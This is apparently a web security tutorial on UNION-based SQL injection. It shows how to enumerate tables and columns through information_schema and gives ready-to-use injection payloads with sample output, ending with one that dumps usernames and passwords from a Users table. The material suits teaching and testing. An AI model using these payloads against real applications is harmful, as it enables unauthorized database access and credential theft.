# Listing the contents of the database

Most modern relational database management systems including **MySQL**, **PostgreSQL**, and **Microsoft SQL Server** (with the notable exception of **Oracle**) expose a standardized set of read-only metadata views known as the `information_schema`. Querying these views in a `UNION` attack lets you map out every table and column in the database without guessing names.

## Step 1: Enumerate Database Tables

To discover what tables exist in the database, query the `information_schema.tables` view (specifically retrieving the `table_name` column in your `UNION SELECT` payload):

```
SELECT * FROM information_schema.tables
```

> In a `UNION` injection where the original query returns two string columns, this looks like: `' UNION SELECT table_name, NULL FROM information_schema.tables--`

### Example Output

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

This reveals three user-created tables: `Products`, `Users`, and `Feedback`.

## Step 2: Enumerate Columns for a Target Table

Once you identify an interesting table (such as `Users`), query the `information_schema.columns` view filtered by `table_name` to list its exact column names and data types:

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

> In a `UNION` injection payload, this looks like: `' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'Users'--`

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

This confirms that the Users table contains `UserId`, `Username`, and `Password` columns, allowing you to construct a final `UNION SELECT Username, Password FROM Users--` payload to dump the credentials.
